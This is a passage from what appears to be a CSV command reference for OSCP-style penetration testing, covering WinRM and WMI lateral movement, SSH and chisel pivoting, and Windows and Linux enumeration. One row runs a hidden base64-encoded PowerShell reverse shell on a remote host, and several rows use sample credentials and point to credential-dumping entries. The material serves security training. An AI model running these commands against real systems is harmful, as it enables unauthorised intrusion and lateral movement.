high port for session data"", ""Win32_Process.Create returns ProcessId (PID) and ReturnValue (0=success)""]}","[""ps-wmi-cimsession-setup"", ""ps-reverse-shell-base64"", ""wmic-process-create""]","","","[""ps-wmi-cimsession-setup"", ""ps-winrm-credential-setup""]","[""wmi-invoke-method"", ""ps-winrm-invoke-command""]","[""mimikatz-sekurlsa-logonpasswords"", ""ps-reverse-shell-base64""]"
"ps-winrm-credential-setup","PowerShell WinRM Credential Object Setup","exploitation","$username = '<USERNAME>'; $password = '<PASSWORD>'; $secureString = ConvertTo-SecureString $password -AsPlaintext -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $secureString","Create PSCredential object for remote authentication via WinRM/PowerShell Remoting","WINRM","$username = 'jen'; $password = 'Nexus123!'; $secureString = ConvertTo-SecureString $password -AsPlaintext -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $secureString","","","[{""command"": ""$username = 'jen'; $password = 'Nexus123!'; $secureString = ConvertTo-SecureString $password -AsPlaintext -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $secureString"", ""description"": ""Create credential object for domain user 'jen' with password 'Nexus123!' for lateral movement"", ""context"": ""OSCP lateral movement scenario""}, {""command"": ""$username = 'CORP\\administrator'; $password = 'P@ssw0rd'; $secureString = ConvertTo-SecureString $password -AsPlaintext -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $secureString"", ""description"": ""Create credential object using DOMAIN\\username format for domain administrator"", ""context"": ""Domain admin lateral movement""}]","{""purpose"": ""Create reusable credential object required for PowerShell remoting authentication without interactive password prompts"", ""manual_alternative"": ""Interactive authentication via Enter-PSSession without -Credential flag (prompts for password)"", ""common_failures"": [""Missing -Force flag causes security warning and script halts"", ""Using single quotes in password string with $ variables causes expansion issues"", ""Not converting to SecureString results in PSCredential constructor error""], ""when_to_use"": [""Before establishing WinRM sessions with New-PSSession"", ""Before using Invoke-Command for remote execution"", ""When you have credentials but need non-interactive authentication""], ""exam_relevance"": ""CRITICAL for OSCP lateral movement - required first step for all WinRM-based attacks"", ""time_estimate"": ""<10 seconds to create object""}","","","","","[""wmi-creds-pscredential""]","[""ps-winrm-invoke-command"", ""winrm-enter-pssession"", ""winrm-new-pssession""]"
"ps-wmi-cimsession-setup","PowerShell WMI CIM Session Creation","exploitation","$options = New-CimSessionOption -Protocol DCOM; $session = New-Cimsession -ComputerName <TARGET> -Credential $credential -SessionOption $options","Create CIM session for WMI-based lateral movement using DCOM protocol","WMI","$options = New-CimSessionOption -Protocol DCOM; $session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $options","","","[{""command"": ""$username = 'jen'; $password = 'Nexus123!'; $secureString = ConvertTo-SecureString $password -AsPlaintext -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $secureString; $options = New-CimSessionOption -Protocol DCOM; $session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $options"", ""description"": ""Full one-liner: Create credentials and establish WMI CIM session to 192.168.50.73"", ""context"": ""Complete WMI lateral movement setup""}, {""command"": ""$options = New-CimSessionOption -Protocol DCOM; $session = New-Cimsession -ComputerName FILES04 -Credential $credential -SessionOption $options"", ""description"": ""Create WMI session to FILES04 (assuming credential object already exists)"", ""context"": ""WMI session after credential setup""}]","{""purpose"": ""Establish WMI session using DCOM protocol for process creation and lateral movement - works when WinRM is disabled but WMI/RPC is available"", ""manual_alternative"": ""Legacy wmic.exe utility (deprecated in Windows 10+): wmic /node:<TARGET> /user:<USER> /password:<PASS> process call create \""<COMMAND>\"""", ""common_failures"": [""RPC port 135 blocked by firewall - WMI requires port 135 + dynamic high port (49152-65535)"", ""User not in Administrators group on target (WMI requires admin rights)"", ""Forgetting -Protocol DCOM option causes default WSMan protocol (WinRM) instead of WMI""], ""when_to_use"": [""WinRM disabled but WMI/RPC available on target"", ""Targeting older Windows systems where WMI is more reliable"", ""Firewall allows RPC (135) but blocks WinRM (5985/5986)"", ""UAC remote restrictions block WinRM for local users""], ""exam_relevance"": ""MEDIUM - Alternative to WinRM when port 5985/5986 unavailable. Critical for understanding multiple lateral movement paths."", ""time_estimate"": ""10-20 seconds to establish session""}","[""ps-winrm-credential-setup"", ""ps-wmi-invoke-method"", ""wmic-process-create""]","","","[""ps-winrm-credential-setup""]","[""wmi-new-cimsession""]","[""ps-wmi-invoke-method""]"
"ps-winrm-invoke-command","PowerShell WinRM Invoke-Command Remote Execution","exploitation","Invoke-Command -ComputerName <TARGET> -Credential $credential -ScriptBlock {<COMMAND>}","Execute commands remotely via WinRM using Invoke-Command with credential object","WINRM","Invoke-Command -ComputerName 192.168.50.73 -Credential $credential -ScriptBlock {whoami; hostname}","","","[{""command"": ""$u='jen';$p='Nexus123!';$s=ConvertTo-SecureString $p -AsPlaintext -Force;$c=New-Object System.Management.Automation.PSCredential $u,$s;Invoke-Command -ComputerName 192.168.50.73 -Credential $c -ScriptBlock {whoami; hostname}"", ""description"": ""One-liner: Create credentials and execute whoami/hostname on remote host 192.168.50.73"", ""context"": ""Quick verification of successful lateral movement""}, {""command"": ""Invoke-Command -ComputerName 192.168.117.70 -Credential $credential -ScriptBlock {Get-Content C:\\Users\\Administrator\\Desktop\\*.txt}"", ""description"": ""Retrieve flag file from administrator's desktop on remote host (assuming credential object already created)"", ""context"": ""OSCP flag retrieval without interactive session""}, {""command"": ""Invoke-Command -ComputerName FILES04 -Credential $credential -ScriptBlock {powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAiACwANAA0ADMAKQA7AA...}"", ""description"": ""Execute base64-encoded reverse shell payload on remote host via WinRM"", ""context"": ""Full lateral movement with reverse shell""}, {""command"": ""Invoke-Command -ComputerName 192.168.50.73 -Credential $credential -ScriptBlock {dir C:\\Users\\Administrator\\Desktop}"", ""description"": ""List files on remote administrator desktop to locate flags before retrieval"", ""context"": ""Enumeration before flag capture""}]","{""purpose"": ""Execute PowerShell commands on remote Windows hosts via WinRM without establishing interactive session - ideal for quick one-off commands or flag retrieval"", ""manual_alternative"": ""Use Enter-PSSession for interactive shell, then run commands manually (slower but more flexible)"", ""common_failures"": [""WinRM not enabled on target (port 5985/5986 closed) - use winrs or WMI instead"", ""User not in Remote Management Users or Administrators group on target"", ""UAC remote restrictions block non-domain users even with local admin credentials""], ""when_to_use"": [""Quick command execution without needing persistent session"", ""Flag retrieval from known file paths on remote hosts"", ""Running reverse shell payloads during lateral movement"", ""Batch operations across multiple hosts (supports -ComputerName array)""], ""exam_relevance"": ""HIGH - fastest method for OSCP flag retrieval after lateral movement. Executes and returns results in single command."", ""time_estimate"": ""5-15 seconds per execution (faster than interactive sessions)""}","[""ps-winrm-credential-setup"", ""ps-winrm-new-pssession"", ""winrs-remote-execution""]","","","[""ps-winrm-credential-setup""]","[""winrm-invoke-command"", ""evil-winrm-creds"", ""wmi-invoke-method""]","[""mimikatz-sekurlsa-logonpasswords"", ""ps-reverse-shell-base64""]"
"service-ssh-start-sysvinit","Start SSH Service (SysVinit)","pivoting","service ssh start","Start SSH daemon using SysVinit service manager on older systems","service-management","","Legacy service management for older Linux distributions.

On systemd:
use 'systemctl start ssh' or 'systemctl start sshd'.

Service name varies:
ssh (Debian/Ubuntu), sshd (RedHat/CentOS).","medium","","","","","","","[""systemctl-start-ssh""]",""
"nmap-localhost-verification","Verify Listening Ports with Nmap","pivoting","nmap localhost","Scan localhost to verify which ports are externally accessible","port-verification","","Verifies ports are listening AND accessible (firewall allows).

Internal verification:
use netstat/ss.

Useful after setting up tunnels or forwarding to confirm external accessibility.","medium","","","","","","","[""netstat-listening-tcp"", ""ss-listening-all""]",""
"netstat-routing-table","View Routing Table with Netstat","pivoting","netstat -rn","Display kernel routing table in numeric format","network-reconnaissance","","Shows default gateway, network routes, and interfaces.

Essential for identifying network segments during pivoting.

Modern alternative:
'ip route' or 'route -n'.","high","","","","","{""-r"": ""Display routing table"", ""-n"": ""Numeric output (no DNS resolution)""}","","",""
"curl-http-service-verification","Verify HTTP Service Accessibility","pivoting","curl http://<TARGET>:<PORT>","Test HTTP connectivity to target service through tunnel or port forward","service-verification","curl http://127.0.0.1:8080","Quick connectivity test after establishing tunnel or port forward.

Add -v for verbose connection details.

Use -x for testing through SOCKS proxy.","high","","","","","","","",""
"ssh-local-port-forward-inline","SSH Local Port Forward (Inline Syntax)","pivoting","ssh -L <LOCAL_PORT>:<TARGET>:<PORT> <SSH_USER>@<SSH_HOST>","Forward local port through SSH to access internal network service","port-forwarding","ssh -L 8080:192.168.10.50:80 user@10.10.10.50","Local port forward:
bind local port that forwards to internal target.

Access via localhost:<LOCAL_PORT>.

Add -N to disable shell, -f for background.

Useful for accessing services on internal networks.","high","","","","","","","[""ssh-local-port-forward""]",""
"crackmapexec-smb-framework","CrackMapExec SMB Framework","pivoting","crackmapexec smb","Modern SMB enumeration and exploitation framework for lateral movement","lateral-movement","","CrackMapExec (cme) is comprehensive toolkit for Active Directory enumeration, credential testing, and lateral movement.

Common usage:
cme smb <target> -u <user> -p <pass>.

Supports pass-the-hash, shares, command execution.","high","","","","","","","[""cme-smb-shares""]",""
"wmic-os-version-specific","Get Specific OS Version via WMIC","pivoting","wmic os get caption,version","Query specific Windows OS information using WMI","system-enumeration","","WMIC deprecated in Windows 10 21H1+.

Modern alternative:
Get-CimInstance Win32_OperatingSystem.

Caption shows OS name, version shows build number.

Useful for identifying target OS quickly.","high","","","","","{""os"": ""WMI class for operating system information"", ""get caption,version"": ""Retrieve only caption and version properties""}","","[""systeminfo-windows"", ""get-computerinfo""]",""
"whoami-all-windows","Complete User Information (Windows)","pivoting","whoami /all","Display comprehensive user information including groups, privileges, and SID","user-enumeration","","Shows username, SID, groups, privileges (enabled/disabled), and integrity level.

Essential for privilege escalation assessment.

Look for SeImpersonatePrivilege, SeBackupPrivilege, etc.","high","","","","","{""/all"": ""Display all information (user, groups, privileges, integrity level)""}","","[""whoami-priv""]",""
"plink-remote-forward-microsocks","Plink Remote Forward with Microsocks","pivoting","plink -R <REMOTE_PORT>:127.0.0.1:<SOCKS_PORT> <SSH_USER>@<SSH_HOST>","Windows SSH remote port forward combined with microsocks for SOCKS proxy (workaround for OpenSSH <7.6)","socks-proxy","plink -R 9050:127.0.0.1:1080 kali@10.10.14.5","Workaround for old OpenSSH versions lacking -D dynamic forward.

Run microsocks locally on Windows, then use plink to forward that port back to attacker.

Attacker configures proxychains to use remote port.","medium","","","","","","","",""
"ip-route-ping-verification","Verify Pivot Routing Capability","pivoting","ip route && ping <DEST_IP>","Verify pivot host can route to destination network","network-verification","ip route && ping 172.16.10.50","Combined check:
'ip route' shows routing table, ping tests connectivity.

Essential before setting up tunnels.

If ping fails but route exists, check firewall rules.","high","","","","","","","",""
"chisel-http-tunneling","Chisel HTTP Tunneling","pivoting","chisel","HTTP tunneling tool for port forwarding when SSH is blocked","tunneling","","Chisel uses HTTP/HTTPS for tunneling (bypasses SSH blocks).

Server:
chisel server -p <port> --reverse.

Client:
chisel client <server>:<port> R:socks or R:<local>:<remote>:<port>.

Supports SOCKS and port forwarding.","high","","","","","","","[""ssh-dynamic-port-forward"", ""sshuttle-vpn""]",""
"test-netconnection-ssh-port","Test Outbound SSH Connectivity (PowerShell)","pivoting","Test-NetConnection <SSH_HOST> -Port 22","Verify firewall allows outbound SSH from Windows target","connectivity-testing","Test-NetConnection 10.10.14.5 -Port 22","PowerShell cmdlet to test TCP connectivity.

Shows TcpTestSucceeded (true/false).

Useful before attempting plink reverse tunnels.

Alternative:
curl telnet://<host>:22","high","","","","","{""-Port 22"": ""Test connectivity to SSH port 22""}","","",""
"plink-remote-forward-windows","Plink Remote Port Forward","pivoting","plink -R <REMOTE_PORT>:127.0.0.1:<LOCAL_PORT> <SSH_USER>@<SSH_HOST>","Windows SSH client for reverse port forwarding (alternative to OpenSSH)","port-forwarding","plink -R 9999:127.0.0.1:3389 kali@10.10.14.5","Plink is PuTTY's CLI SSH client.

Use -R for reverse tunnels (expose internal port to attacker).

Add -N to disable shell.

Accept host key with -batch or echo y | plink ...","high","","","","","","","[""plink-remote-forward""]",""
"proxychains-config-verify","Verify Proxychains Configuration","pivoting","cat /etc/proxychains4.conf","Verify proxychains configuration has correct SOCKS proxy settings","proxy-configuration","","Check [ProxyList] section at bottom:
'socks5 127.0.0.1 1080' (or your SOCKS port).

Ensure only one active proxy line.

Test with:
proxychains4 curl http://10.10.10.1","high","","","","","","","[""proxychains-config""]",""
"systemctl-start-ssh","Start SSH Server via Systemd","pivoting","sudo systemctl start ssh","Start OpenSSH server using systemd - required for receiving SSH tunnels from compromised hosts","ssh-tunneling","","Critical OSCP technique:
Start SSH server on attack machine to receive reverse SSH tunnels from compromised Windows/Linux hosts.

Plink (Windows) and ssh (Linux) can connect back to this server to establish port forwarding.

Default Kali:
SSH server pre-installed but not started.

Always verify PasswordAuthentication yes in sshd_config if using passwords (keys preferred for OPSEC).

Use systemctl enable ssh to start at boot (optional).

Time estimate:
30 seconds.

Production:
Use key authentication only, disable password auth.","high","","","","{""Unit ssh.service not found"": ""Install OpenSSH server: sudo apt install openssh-server -y"", ""Port 22 already in use"": ""Check for existing SSH server: sudo lsof -i :22, kill if needed: sudo kill <PID>"", ""Failed to bind port 22: Permission denied"": ""Requires sudo - port <1024 needs root privileges"", ""Service failed to start"": ""Check logs: sudo journalctl -u ssh -xe, look for config errors in /etc/ssh/sshd_config""}","{""sudo"": ""Root privileges required to manage system services"", ""systemctl"": ""Systemd service manager - controls service lifecycle"", ""start"": ""Start service immediately (does not enable at boot)"", ""ssh"": ""Service name for OpenSSH server daemon (sshd)""}","","[""service-ssh-start-sysvinit""]",""
"apache2-start","Start Apache Web Server","pivoting","sudo systemctl start apache2","Start Apache HTTP server - serve files from /var/www/html for file transfer to compromised hosts","file-transfer","","Essential OSCP file transfer technique:
Serve exploits, payloads, enumeration scripts to compromised hosts.

Default web root:
/var/www/html/.

Common pattern:
cp LinEnum.sh /var/www/html/  wget http://<LHOST>/LinEnum.sh on target.

Advantages over Python HTTP server:
Service management, logging, performance.

Disadvantage:
Requires root for port 80.

Alternative:
python3 -m http.server 8000 runs unprivileged on port 8000.

Always monitor /var/log/apache2/access.log to confirm target downloaded file.

Time estimate:
30 seconds.

Production:
Use TLS, authentication, non-standard ports.","high","","","","{""Unit apache2.service not found"": ""Install Apache: sudo apt install apache2 -y"", ""Port 80 already in use"": ""Check process: sudo lsof -i :80, stop conflicting service (e.g., sudo systemctl stop nginx), or use alternate port in /etc/apache2/ports.conf"", ""403 Forbidden when accessing file"": ""Fix permissions: sudo chmod 644 /var/www/html/file, ensure directory traversal allowed in Apache config"", ""Target cannot reach server"": ""Verify LHOST routing: ip addr show tun0, test with: curl http://<LHOST> from another machine""}","{""sudo"": ""Root privileges required to manage system services and bind port 80"", ""systemctl"": ""Systemd service manager"", ""start"": ""Start service immediately (does not persist after reboot unless enabled)"", ""apache2"": ""Service name for Apache HTTP server""}","","","[""ss-listening-ports"", ""ip-addr""]"
"ss-listening-ports","Display Listening Ports (ss)","pivoting","ss -ntplu","Display all listening TCP/UDP ports with process information - verify SSH/HTTP servers started and port forwards active","enumeration","","Critical OSCP verification command:
Confirm SSH/Apache/port forwards are listening before attempting connections.

Modern replacement for netstat (faster, part of iproute2).

Common workflow:
Start service  ss -ntplu | grep :<PORT>  Verify process name matches.

Port forward debugging:
Check for 127.0.0.1:<REMOTE_PORT> entry to confirm tunnel established.

Process column shows which service owns each port - essential for troubleshooting port conflicts.

Output format:
State Recv-Q Send-Q Local_Address:Port Peer_Address:Port Process.

Time estimate:
5 seconds.

Alias tip:
alias ports='ss -ntplu' for quick access.","high","","","","{""ss: command not found"": ""Install iproute2: sudo apt install iproute2, or use netstat alternative: netstat -ntplu"", ""Process column empty"": ""Run with sudo: sudo ss -ntplu to see process information for all sockets"", ""Expected port not listed"": ""Service not running - check with: sudo systemctl status <service>, start if needed"", ""Port shows LISTEN but connection fails"": ""Firewall blocking - check: sudo ufw status or sudo iptables -L -n""}","{""-n"": ""Numeric output - show IP addresses and ports as numbers (no DNS resolution)"", ""-t"": ""Show TCP sockets only"", ""-p"": ""Show process using each socket (PID and program name)"", ""-l"": ""Show only listening sockets (servers waiting for connections)"", ""-u"": ""Show UDP sockets (combined with -t to show both TCP and UDP)""}","","[""nmap-localhost-verification""]",""
"ip-addr","Display Network Interfaces","pivoting","ip addr","Display all network interfaces and assigned IP addresses - identify LHOST for reverse shells and tunnels","enumeration","","Essential OSCP command:
Determine LHOST value for reverse shells and SSH tunnels.

Modern replacement for ifconfig.

Common pattern:
VPN connects  ip addr show tun0  Note IP  Use in exploit payloads.

Interface states:
UP/DOWN in output.

IP format:
inet <IP>/<CIDR> brd <broadcast>.

IPv6 addresses shown as inet6.

Shorthand:
ip a (same as ip addr).

Output includes:
Link layer (MAC), IP layer (addresses), interface state (UP/DOWN/UNKNOWN).

Time estimate:
5 seconds.

OSCP critical:
Always verify tun0 IP before starting engagement.","high","","","","{""ip: command not found"": ""Install iproute2: sudo apt install iproute2, or use ifconfig alternative"", ""tun0 interface missing"": ""VPN not connected - start OpenVPN: sudo openvpn lab.ovpn"", ""Interface DOWN"": ""Bring up interface: sudo ip link set <interface> up"", ""No IP assigned"": ""Request DHCP: sudo dhclient <interface> or assign static: sudo ip addr add <IP>/24 dev <interface>""}","{""ip"": ""iproute2 command - modern networking utility"", ""addr"": ""Address management - show/manipulate IP addresses (can also use 'ip a' shorthand)""}","","","[""ssh-remote-port-forward"", ""apache2-start"", ""ip-route""]"
"ip-route","Display Routing Table","pivoting","ip route","Display kernel routing table - verify VPN routes and identify network topology for pivoting","enumeration","","Important OSCP enumeration:
Understanding routing helps identify network topology and multi-homed pivot points.

Modern replacement for route -n.

Output format:
<destination> via <gateway> dev <interface> [proto <protocol>] [metric <priority>].

Scope link means directly connected network (no gateway).

Proto kernel means automatically added by kernel.

Pivoting use case:
On compromised host, ip route reveals other network segments accessible from that host - indicates potential pivot paths.

Time estimate:
5 seconds.

Production:
Static routes persist with /etc/network/interfaces or NetworkManager.","medium","","","","{""ip: command not found"": ""Install iproute2: sudo apt install iproute2, or use route -n alternative"", ""No default route"": ""Add default route: sudo ip route add default via <gateway_ip> dev <interface>"", ""Duplicate routes"": ""Delete old route: sudo ip route del <destination> via <old_gateway>, then add correct route"", ""Cannot reach target network"": ""Check routing table, add static route if needed, verify firewall rules""}","{""ip"": ""iproute2 command - modern networking utility"", ""route"": ""Routing table management - show/manipulate kernel routing table (can also use 'ip r' shorthand)""}","","[""netstat-routing-table""]",""
"nmap-port-check","Quick Port Verification (Nmap)","pivoting","sudo nmap -p <PORT> -Pn -v <TARGET>","Verify specific port is open and reachable - confirm SSH/HTTP server started or port forward active","enumeration","sudo nmap -p 22 -Pn -v 192.168.45.100","Critical OSCP verification technique:
Confirm services started before attempting connections.

Use cases:
1) Verify SSH server listening after systemctl start ssh, 2) Confirm port forward active after Plink/SSH tunnel, 3) Check HTTP server before wget from target, 4) Validate RDP access before xfreerdp.

Always use -Pn flag to skip ping (OSCP hosts often block ICMP).

Verbose (-v) provides progress feedback during scan.

Fast alternative for localhost:
nc -zv localhost <PORT>.

Time estimate:
2-5 seconds per port.

Production:
Use -sV for version detection, --script for vulnerability scanning.","high","","","","{""Connection timed out"": ""Firewall blocking, verify network path with: traceroute <TARGET>, check local firewall: sudo iptables -L -n"", ""Port filtered consistently"": ""Host-based firewall active - may need to adjust rules on target or use alternative port"", ""Nmap scan very slow"": ""Add -T4 for faster timing (less stealthy): sudo nmap -p <PORT> -Pn -v -T4 <TARGET>"", ""Permission denied without sudo"": ""Raw socket operations require root - always use sudo for accurate results""}","{""sudo"": ""Root privileges required for raw socket access and accurate service detection"", ""-p"": ""Port specification - can be single port (22), range (1-1000), or list (22,80,443)"", ""-Pn"": ""Skip host discovery (no ping) - treat host as alive, essential for firewalled hosts"", ""-v"": ""Verbose output - show progress and detailed results during scan""}","","[""curl-http-service-verification""]",""
"psql-connect","PostgreSQL Client Connection","pivoting","psql -h <TARGET> -p <PORT> -U <USERNAME> -d <DATABASE>","Connect to PostgreSQL database server - enumerate databases, tables, and extract credentials after pivoting","database-access","psql -h 10.4.50.215 -p 5432 -U postgres -d postgres","Critical OSCP database enumeration technique:
Extract credentials, application data, and potentially execute commands with superuser privileges.

Common pivoting pattern:
Port scan reveals 5432 internal  SSH local port forward  psql to 127.0.0.1  Dump credentials.

PostgreSQL superuser capabilities:
COPY TO PROGRAM for command execution (9.3+), COPY FROM for file reading, CREATE EXTENSION for loading malicious libraries.

Metafile commands:
\l (databases), \dt (tables), \du (users), \d <table> (describe), \c <db> (switch database), \q (quit).

Default credentials to try:
postgres:postgres, postgres:<blank>, admin:admin.

Time estimate:
1-2 minutes for initial enumeration.

Production:
Always use SSL, restrict pg_hba.conf, disable superuser remote access.","high","","","","{""Connection refused"": ""Verify PostgreSQL running: sudo nmap -p <PORT> -Pn -v <TARGET>, check postgresql.conf for listen_addresses, verify pg_hba.conf allows remote connections"", ""Password authentication failed"": ""Check credentials, try default postgres:postgres, use -W to force password prompt"", ""Database does not exist"": ""Connect to default database: psql -h <TARGET> -U postgres (omit -d flag), then list databases with \\l"", ""psql: command not found"": ""Install PostgreSQL client: sudo apt install postgresql-client -y"", ""SSL connection error"": ""Disable SSL: psql -h <TARGET> -U <USER> -d <DB> sslmode=disable"", ""No route to host"": ""Set up port forward if database is internal: ssh -L 5432:<TARGET>:5432 pivot_user@pivot_host, then psql -h 127.0.0.1""}","{""-h"": ""Host - PostgreSQL server IP address or hostname"", ""-p"": ""Port - PostgreSQL service port (default 5432 if omitted)"", ""-U"": ""Username - database user for authentication"", ""-d"": ""Database - specific database to connect to (default: postgres)"", ""-W"": ""(Optional) Force password prompt - useful if password not in .pgpass"", ""-c"": ""(Optional) Execute single command and exit - e.g., psql -h <HOST> -U <USER> -c 'SELECT version();'""}","[""nmap-service-scan"", ""ssh-local-port-forward""]","",""
"smbclient-list-shares","SMB Share Enumeration (No Auth)","pivoting","smbclient -N -L //<TARGET>","List SMB shares without authentication (null session) - discover accessible shares for file enumeration","smb-enumeration","smbclient -N -L //192.168.50.63","Essential OSCP SMB enumeration technique:
Null sessions reveal share names without credentials - often exposes sensitive files, backup configs, or writable directories for payload upload.

Null sessions common on:
Windows 2000/XP/2003, misconfigured Windows 7/2008.

Modern Windows (10/2019+) disables null sessions by default.

Common share names:
ADMIN$ (C:\Windows), C$ (C:\), IPC$ (inter-process communication), NETLOGON, SYSVOL (domain controllers), Users, Backups, Public.

Writable share use case:
Upload malicious file  Execute via RCE vulnerability.

Time estimate:
5-10 seconds.

Production:
Always disable null sessions, restrict share permissions, use SMB signing.","high","","","","{""NT_STATUS_ACCESS_DENIED"": ""Null sessions disabled - try authenticated access with -U flag, or enumerate users first: enum4linux -U <TARGET>"", ""Connection timeout"": ""Verify SMB port open: sudo nmap -p 445 -Pn -v <TARGET>, check for firewall blocking port 445"", ""smbclient: command not found"": ""Install Samba client: sudo apt install smbclient -y"", ""Protocol negotiation failed"": ""SMBv1 disabled - force SMB2: smbclient -N -L //<TARGET> --option='client min protocol=SMB2'"", ""Unable to initialize messaging context"": ""Non-critical warning - ignore if shares still listed""}","{""-N"": ""No password - attempt null session (anonymous login without credentials)"", ""-L"": ""List shares - display available shares on target server"", ""//"": ""UNC path prefix - standard SMB notation for network paths""}","[""nmap-service-scan""]","[""enum4linux-smb"", ""smbmap-shares""]","[""smbclient-connect"", ""enum4linux-smb"", ""smbmap-shares""]"
"netsh-portproxy-delete","Netsh Delete Port Forward","pivoting","netsh interface portproxy delete v4tov4 listenport=<LISTEN_PORT> listenaddress=<LISTEN_IP>","Remove netsh port forwarding rule - cleanup after pivoting","windows-tunneling","netsh interface portproxy delete v4tov4 listenport=2222 listenaddress=0.0.0.0","Critical for cleanup in OSCP exam - remove port forwards to avoid leaving persistent backdoors.

Also delete associated firewall rules with netsh-firewall-delete-rule.

For complete cleanup:
netsh interface portproxy reset (removes all rules).","medium","","","","{""Element not found"": ""Verify exact rule: netsh interface portproxy show all, ensure listenaddress matches (e.g., 0.0.0.0 vs 192.168.x.x)"", ""Access denied"": ""Run as Administrator""}","{""delete v4tov4"": ""Remove IPv4-to-IPv4 port forwarding rule""}","","",""
"where-windows","Where - Find Executable","pivoting","where <EXECUTABLE>","Locate executable in Windows PATH - verify tool availability","enumeration","where ssh","Quick check for tool availability.

Common OSCP checks:
where ssh (OpenSSH client), where python, where powershell, where curl.

Equivalent to Linux 'which' command.","medium","","","","","","","",""
"systeminfo-windows","System Information","pivoting","systeminfo","Display detailed Windows system information - OS version, patches, network config","enumeration","","Critical OSCP enumeration command.

Check:
OS version (for exploit research), Hotfix list (missing patches = vulnerabilities), Network adapters (multi-homed = pivot candidate), System Type (32-bit vs 64-bit for exploit selection).

Time estimate:
5-10 seconds for output.","high","","","","","","[""evil-winrm-shell""]","[""ipconfig-all"", ""get-computerinfo""]","[""win-privesc-winpeas"", ""win-kernel-exploits""]"
"whoami-priv","Whoami Privileges","pivoting","whoami /priv","Display current user privileges - check for admin rights and dangerous privileges","enumeration","","Critical for privilege escalation assessment.

Key privileges:
SeImpersonatePrivilege (Potato exploits), SeDebugPrivilege (process injection), SeBackupPrivilege (backup file access), SeRestorePrivilege (file restore), SeLoadDriverPrivilege (driver loading).

If high-value privilege present, search for corresponding exploit.

Time estimate:
immediate.","high","","","","","{""/priv"": ""Display user privileges"", ""/all"": ""(Alternative) Display all user info including groups and SID""}","[""evil-winrm-shell""]","[""whoami-priv"", ""whoami-all""]","[""windows-potato-attacks"", ""win-potato-exploits""]"
"ipconfig-all","IP Configuration All","pivoting","ipconfig /all","Display detailed network configuration - identify dual-homed hosts and internal subnets","enumeration","","Critical OSCP enumeration for pivot identification.

Look for:
Multiple network adapters (dual-homed = pivot candidate), Internal IP ranges (10.x, 172.16-31.x, 192.168.x = potential pivot targets), DNS servers (identify domain controllers).

Common pattern:
Host has 192.168.45.x (WAN) and 172.16.50.x (internal) = perfect pivot point.

Time estimate:
immediate.","high","","","","","{""/all"": ""Display full configuration (DNS, WINS, adapters)""}","[""evil-winrm-shell""]","[""systeminfo-windows"", ""ipconfig-all""]","[""netstat-windows"", ""ssh-dynamic-port-forward"", ""chisel-client""]"
"netstat-windows","Netstat Network Connections","pivoting","netstat -ano","Display all network connections and listening ports with process IDs - enumerate services","enumeration","","Critical for service enumeration and port forward verification.

Use cases:
Identify listening ports (potential services), Find established connections (active pivots), Verify port forward active (netstat -ano | findstr <PORT>), Map PID to process (tasklist | findstr <PID>).

Combine with netsh-portproxy-show to see full pivot configuration.

Time estimate:
immediate.","high","","","","","{""-a"": ""Display all connections and listening ports"", ""-n"": ""Display addresses and port numbers in numerical form (faster)"", ""-o"": ""Display owning process ID (PID)"", ""-b"": ""(Optional) Display executable name (requires admin)""}","[""evil-winrm-shell""]","[""netstat-windows"", ""ss-listening-ports""]","[""ssh-dynamic-port-forward"", ""chisel-client"", ""proxychains-nmap""]"
"ssh-local-port-forward","SSH Local Port Forward","pivoting","ssh -N -L <BIND_ADDRESS>:<LOCAL_PORT>:<DEST_IP>:<DEST_PORT> <SSH_USER>@<SSH_HOST>","Create SSH local port forward - listening port on SSH client forwards through tunnel to destination","ssh_tunneling","ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215","Local port forward limitation:
One socket per -L flag.

For multiple services, use multiple -L flags in single SSH command or use dynamic port forward (-D) with SOCKS proxy.

Common OSCP use case:
Access internal database/SMB from Kali through compromised DMZ host.","high","","","","{""Port already in use"": ""Check listening ports: ss -ntplu, choose different port or kill conflicting process"", ""Permission denied for port <1024"": ""Use port >1024 (e.g., 4455, 8080) or run with sudo (not recommended)"", ""Timeout connecting to SSH server"": ""Verify SSH server reachable: nc -zv <SSH_HOST> 22, check firewall rules"", ""Can bind port but connection hangs"": ""Destination unreachable from pivot - verify routing: ssh user@host 'nc -zv <DEST_IP> <DEST_PORT>'""}","{""-N"": ""Do not execute remote command (no shell) - only creates port forward tunnel"", ""-L"": ""Local port forward - syntax: [bind_address:]port:host:hostport"", ""-v"": ""(Optional) Verbose mode for troubleshooting - shows connection details and debug info"", ""-f"": ""(Optional) Background SSH process after authentication - frees up terminal""}","[""ssh-connect""]","[""chisel-client"", ""plink-remote-forward"", ""ssh-local-forward""]","[""nmap-service-scan"", ""psql-connect"", ""smbclient-list-shares""]"
"ssh-dynamic-port-forward","SSH Dynamic Port Forward (SOCKS Proxy)","pivoting","ssh -N -D <BIND_ADDRESS>:<SOCKS_PORT> <SSH_USER>@<SSH_HOST>","Create SSH dynamic port forward - SOCKS proxy on SSH client for flexible multi-destination tunneling","ssh_tunneling","ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215","Dynamic forward creates SOCKS5 proxy supporting multiple concurrent connections.

More flexible than local forward (-L) which requires separate tunnel per destination.

Common OSCP pattern:
Use for internal network enumeration (nmap through proxychains), then switch to local forward for specific services.

Proxychains limitation:
